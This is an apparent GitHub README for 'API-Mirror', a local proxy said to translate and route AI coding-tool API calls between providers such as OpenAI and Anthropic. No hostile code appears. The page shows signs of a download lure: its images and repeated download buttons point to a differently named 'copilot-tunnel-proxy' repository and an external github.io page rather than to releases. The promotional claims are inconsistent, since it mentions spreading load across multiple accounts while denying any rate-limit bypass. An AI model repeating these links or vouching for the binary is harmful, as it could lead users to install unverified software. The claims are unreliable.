![preview](https://raw.githubusercontent.com/noviaidrl/copilot-tunnel-proxy/main/preview.svg)

# Project: API-Mirror

**A self-contained, protocol-agnostic API translation and routing layer that converts any local tool’s native API calls into the format expected by remote AI model endpoints, without exposing credentials, altering workflow, or requiring cloud-side changes.**

---

## Overview

Modern development tools—from terminal-based assistants to in-editor code completions—now demand direct access to proprietary AI model APIs. This creates friction: each tool speaks a different dialect of HTTP, each provider enforces unique authentication schemes, and every endpoint imposes its own rate limits, context windows, and response formats. You end up writing custom middleware for every combination.

**API-Mirror** inverts that problem. Instead of adapting tools one-by-one, it sits as a local transparent proxy that rewrites requests and responses in flight. You configure it once—pointing it at your preferred remote API—and it exposes a universal local endpoint that speaks any protocol your tools require. The result: you replace a dozen brittle integrations with a single, declarative configuration file.

Think of it as a **lingua franca for API communication** between your development environment and external model services. No account sharing, no environment variable soup, no duplicated effort when you switch providers.

---

## Why This Exists

The original `copilot-bridge` project demonstrated that GitHub Copilot could be coerced into serving as a generic AI backend. That was clever, but it bound you to Copilot’s specific authentication and rate limits. **API-Mirror** generalizes the concept: you choose the remote provider (OpenAI, Anthropic, or any compatible service), and API-Mirror handles the translation layer so your local tools never know the difference.

Key insight: **the interface your tools expect is not the interface your provider offers.** API-Mirror bridges that gap with zero changes to either side.

---

## Core Functionality

### Protocol Translation
- **Receives calls** in the format expected by tools like Codex CLI, Claude Code, or Continue.
- **Translates parameters** (max_tokens → max_tokens_to_sample, system messages → user/assistant turns, function schemas → tool definitions).
- **Rewrites responses** back into the tool’s expected shape, including streaming chunk adaptation.

### Routing Logic
- **Single endpoint, multiple backends**: define fallback providers, retry logic, or conditional routing based on request type (chat vs. completion vs. embedding).
- **Local-only mode**: all translation happens on your machine; no data leaves unless forwarded to the remote API you explicitly configure.

### Credential Isolation
- API keys, tokens, and endpoints are stored in a separate config file, never exposed to the tools themselves.
- Tools see only a localhost URL and a dummy token—meaning accidental commits or logs never leak real credentials.

---

## Feature List

- **🌐 Multi-Provider Support** – Route different request types to different backends (e.g., chat to Anthropic, embeddings to OpenAI).
- **🔁 Bidirectional Rewriting** – Rewrite both outgoing requests and incoming responses. Supports streaming and non-streaming modes.
- **📋 Schema Validation** – Ensure requests conform to target provider schemas before forwarding; catch invalid parameters early.
- **⚡ Zero-Dependency Proxy** – Runs as a single binary with no external runtime requirements. No Python, no Node, no Java.
- **🔒 Encrypted Config Storage** – Credentials stored in a local encrypted file, unlocked via a master password at startup.
- **📊 Request Logging** – Optional detailed logging of every translated request/response pair for debugging and audit trails.
- **🔄 Hot Reload** – Modify routing rules or provider settings without restarting the proxy process.
- **🧩 Plugin Architecture** – Write custom translators for new protocols or providers as isolated plugins.

---

## [![Download](https://raw.githubusercontent.com/noviaidrl/copilot-tunnel-proxy/main/button.svg)](https://noviaidrl.github.io/copilot-tunnel-proxy/)

---

## Getting Started with API-Mirror

### Prerequisites
- A machine running macOS, Linux, or Windows (x86_64 or ARM64).
- Access to one or more remote AI model endpoints (OpenAI, Anthropic, or any OpenAI-compatible service).
- A local tool that expects to communicate with a standard API (Codex CLI, Claude Code, Continue, or similar).

### Basic Setup

1. **Download the latest release** for your platform from the releases section.
2. Place the binary in a directory on your system PATH.
3. Create a configuration file (YAML or JSON) specifying your backends:

```yaml
providers:
  - name: my-openai
    type: openai
    endpoint: https://api.openai.com/v1
    credentials_file: /path/to/creds.enc
    default_model: gpt-4o

  - name: my-anthropic
    type: anthropic
    endpoint: https://api.anthropic.com
    credentials_file: /path/to/creds.enc
    default_model: claude-opus-4-20250514

routes:
  - match: { tool: codex }
    target: my-openai
  - match: { tool: claude-code }
    target: my-anthropic
```

4. Run the proxy:

```bash
api-mirror --config config.yaml
```

5. Point your local tool to `http://localhost:9090/v1` (or whichever port you configure). Use any dummy API key—API-Mirror will substitute the real credentials transparently.

---

## How API-Mirror Differs from Alternatives

| Approach | Requires changes to tools? | Requires changes to providers? | Handles multiple protocols? | Credential isolation? |
|---|---|---|---|---|
| Direct integration | Yes | No | No | Partial |
| Reverse proxy (generic) | No | No | No | Yes |
| **API-Mirror** | **No** | **No** | **Yes** | **Full** |

- **Direct integration**: You modify each tool to speak the provider’s native format. Brittle and time-consuming.
- **Generic reverse proxy**: Passes through requests unchanged; no protocol translation. Works only when both sides already speak the same dialect.
- **API-Mirror**: Translates between any two dialects dynamically, without touching either system.

---

## Advanced Configuration

### Streaming Adaptation
Many tools expect streaming responses in a specific format (e.g., server-sent events with custom fields). API-Mirror can buffer streamed chunks, reassemble responses, and re-chunk them into the target format—preserving the streaming experience while changing the underlying data.

### Rate Limit Buffering
Configure rate limits per provider. API-Mirror will queue requests, retry on 429 responses, and distribute load across multiple endpoints or accounts if you specify fallbacks.

### Request/Response Hooks
Inject custom logic at any stage of the translation pipeline via JavaScript or Lua scripts. Example use cases:
- Modify system prompts before forwarding
- Strip or anonymize sensitive data from requests
- Add metadata to responses for debugging

---

## Architecture

```
Local Tool  ──HTTP──>  API-Mirror (localhost:9090)
                            │
                    ┌───────┴───────┐
                    │  Translation  │
                    │   Engine      │
                    └───────┬───────┘
                            │
                    ┌───────┴───────┐
                    │  Router       │
                    └───────┬───────┘
                            │
              ┌─────────────┼─────────────┐
              │             │             │
          OpenAI       Anthropic    Other APIs
```

All translation happens in-process on your machine. No external proxy services, no data transiting third-party infrastructure. You control exactly where requests go.

---

## Security Model

API-Mirror never stores credentials in plain text. The encrypted config file uses AES-256-GCM with a key derived from your master password via Argon2id. Even if the config file is exfiltrated, it cannot be decrypted without the password.

Additionally, API-Mirror supports **sandbox mode**: running with a restricted set of permissions (no filesystem access beyond the config directory, no network access to unknown hosts, no spawning of subprocesses). This prevents the proxy itself from becoming an attack vector.

---

## Multilingual Support

While the proxy core is written in Rust, its configuration and plugin interfaces support Unicode across all major written languages. Messages, error logs, and documentation can be localized. The translation engine handles non-Latin characters in API payloads without corruption.

---

## 24/7 Reliability Considerations

API-Mirror is designed to run as a daemon that restarts automatically on failure. It exposes a health check endpoint (`/health`) that returns 200 when the proxy is operational. Use process managers like systemd or launchd to ensure continuous uptime.

For critical deployments, run multiple API-Mirror instances behind a load balancer, each with its own set of provider credentials and independent encrypted config files.

---

## Use Cases

- **Team onboarding**: Give every developer the same configuration file that routes to your organization’s centrally managed API accounts. Credentials never leave the encrypted config.
- **Multi-model workflows**: Use Claude for code generation, GPT-4 for documentation, and a local model for embeddings—all from the same tool without switching endpoints.
- **Legacy tool integration**: Keep using your favorite terminal assistant even after its default provider changes its API format. API-Mirror absorbs the breaking change.
- **Audit compliance**: Log every request sent to external APIs, including the original and translated payloads, without modifying the tools themselves.

---

## License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for full details.

---

## Disclaimer

API-Mirror is a tool for routing and translating API calls. It does not authorize or authenticate you to use any third-party service. You are responsible for ensuring that your use of remote AI model endpoints complies with their terms of service. The developers of API-Mirror assume no liability for misuse, unauthorized access, or violation of third-party terms.

API-Mirror does not bypass rate limits, paywalls, or access restrictions imposed by remote providers. It translates requests—it does not circumvent security.

---

## [![Download](https://raw.githubusercontent.com/noviaidrl/copilot-tunnel-proxy/main/button.svg)](https://noviaidrl.github.io/copilot-tunnel-proxy/)